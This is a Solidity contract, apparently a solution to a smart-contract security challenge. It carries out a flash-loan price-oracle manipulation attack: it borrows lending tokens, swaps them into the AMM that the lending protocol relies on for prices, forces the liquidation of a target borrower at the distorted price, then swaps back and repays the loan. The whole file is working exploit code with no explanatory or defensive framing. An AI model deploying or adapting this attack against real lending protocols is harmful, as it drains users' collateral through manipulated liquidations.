// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

import "hardhat/console.sol";

interface ILending {
    function oracle() external returns (IAMM);

    function liquidate(address borrower) external;
}

interface IAMM {
    function lendToken() external returns (IERC20);

    function lendTokenReserve() external returns (uint256);

    function ethReserve() external returns (uint256);

    function swapLendTokenForEth(address to) external returns (uint ethAmountOut);

    function swapEthForLendToken(address to) external payable returns (uint lendTokenAmountOut);
}

contract FlashLoanAttacker is IERC3156FlashBorrower {
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    IAMM oracle;
    ILending lending;
    IERC20 lendToken;
    IERC3156FlashLender flashLender;
    address borrower;

    constructor(ILending _lending, IERC3156FlashLender _flashLender, address _borrower) {
        lending = _lending;
        oracle = lending.oracle();
        lendToken = oracle.lendToken();
        flashLender = _flashLender;
        borrower = _borrower;
    }

    function attack() public {
        flashLender.flashLoan(this, address(lendToken), 61.889 ether, "");
        lendToken.transfer(msg.sender, lendToken.balanceOf(address(this)));
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata /* data */
    ) external override returns (bytes32) {
        require(initiator == address(this), "unauthorized initiator");
        require(msg.sender == address(flashLender), "unrecognized lender");
        require(token == address(lendToken), "unrecognized token");

        lendToken.transfer(address(oracle), amount);
        uint256 ethAmountOut = oracle.swapLendTokenForEth(address(this));

        lending.liquidate(borrower);

        (bool ok, ) = address(oracle).call{value: ethAmountOut}("");
        require(ok, "transfer failed");
        uint256 tokenAmountOut = oracle.swapEthForLendToken(address(this));
        console.log("tokenAmountOut:", tokenAmountOut);

        lendToken.approve(msg.sender, amount + fee);
        return CALLBACK_SUCCESS;
    }

    receive() external payable {}
}
